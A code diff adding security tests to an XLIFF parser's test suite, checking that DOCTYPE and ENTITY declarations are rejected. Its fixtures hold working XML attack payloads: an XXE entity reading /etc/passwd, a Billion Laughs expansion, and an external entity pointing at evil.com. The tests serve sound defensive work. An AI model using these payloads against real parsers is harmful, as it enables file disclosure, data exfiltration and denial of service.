@@ -760,6 +760,106 @@ describe('parseXliff', () => {
     })
   })
 
+  describe('XXE prevention — DOCTYPE/ENTITY rejection (R-001)', () => {
+    it('should reject XML with DOCTYPE declaration (XXE attack)', () => {
+      const xxePayload = `<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+  <file original="test.docx" source-language="en-US" target-language="th-TH" datatype="plaintext">
+    <body>
+      <trans-unit id="1">
+        <source>&xxe;</source>
+        <target>target</target>
+      </trans-unit>
+    </body>
+  </file>
+</xliff>`
+      const result = parseXliff(xxePayload, 'xliff')
+      expect(result.success).toBe(false)
+      if (result.success) return
+      expect(result.error.code).toBe('INVALID_XML')
+      expect(result.error.message).toContain('DOCTYPE')
+      expect(result.error.details).toContain('XXE')
+    })
+
+    it('should reject Billion Laughs attack (entity expansion DoS)', () => {
+      const billionLaughs = `<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<xliff version="1.2"><file original="x" source-language="en" target-language="th" datatype="plaintext">
+<body><trans-unit id="1"><source>&lol3;</source><target>t</target></trans-unit></body>
+</file></xliff>`
+      const result = parseXliff(billionLaughs, 'xliff')
+      expect(result.success).toBe(false)
+      if (result.success) return
+      expect(result.error.code).toBe('INVALID_XML')
+    })
+
+    it('should reject ENTITY declaration without DOCTYPE wrapper', () => {
+      // Some parsers accept standalone ENTITY declarations
+      const entityOnly = `<?xml version="1.0"?>
+<!ENTITY secret SYSTEM "http://evil.com/steal">
+<xliff version="1.2"><file original="x" source-language="en" target-language="th" datatype="plaintext">
+<body><trans-unit id="1"><source>test</source><target>t</target></trans-unit></body>
+</file></xliff>`
+      const result = parseXliff(entityOnly, 'xliff')
+      expect(result.success).toBe(false)
+      if (result.success) return
+      expect(result.error.code).toBe('INVALID_XML')
+    })
+
+    it('should reject case-insensitive DOCTYPE variations', () => {
+      const upperDoctype = `<?xml version="1.0"?>
+<!doctype foo [<!entity x "y">]>
+<xliff version="1.2"><file original="x" source-language="en" target-language="th" datatype="plaintext">
+<body><trans-unit id="1"><source>test</source><target>t</target></trans-unit></body>
+</file></xliff>`
+      const result = parseXliff(upperDoctype, 'xliff')
+      expect(result.success).toBe(false)
+      if (result.success) return
+      expect(result.error.code).toBe('INVALID_XML')
+    })
+
+    it('should accept valid XLIFF without DOCTYPE (no false positive)', () => {
+      const validXliff = `<?xml version="1.0" encoding="utf-8"?>
+<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+  <file original="test.docx" source-language="en-US" target-language="th-TH" datatype="plaintext">
+    <body>
+      <trans-unit id="1">
+        <source>Hello world</source>
+        <target>สวัสดีโลก</target>
+      </trans-unit>
+    </body>
+  </file>
+</xliff>`
+      const result = parseXliff(validXliff, 'xliff')
+      expect(result.success).toBe(true)
+    })
+
+    it('should accept XLIFF with text containing "DOCTYPE" as content (no false positive)', () => {
+      // The word "DOCTYPE" in segment content should not trigger rejection
+      // because our regex checks for "<!DOCTYPE" specifically
+      const xliffWithDoctypeText = `<?xml version="1.0" encoding="utf-8"?>
+<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
+  <file original="test.docx" source-language="en-US" target-language="th-TH" datatype="plaintext">
+    <body>
+      <trans-unit id="1">
+        <source>The DOCTYPE element defines the document type</source>
+        <target>สิ่งที่ DOCTYPE กำหนดคือประเภทเอกสาร</target>
+      </trans-unit>
+    </body>
+  </file>
+</xliff>`
+      const result = parseXliff(xliffWithDoctypeText, 'xliff')
+      expect(result.success).toBe(true)
+    })
+  })
+
   describe('unrecognized sdl:seg conf attribute fallback (M7)', () => {
     it('should set confirmationState to null for unknown conf values', () => {
       const xml = `<?xml version="1.0" encoding="utf-8"?>
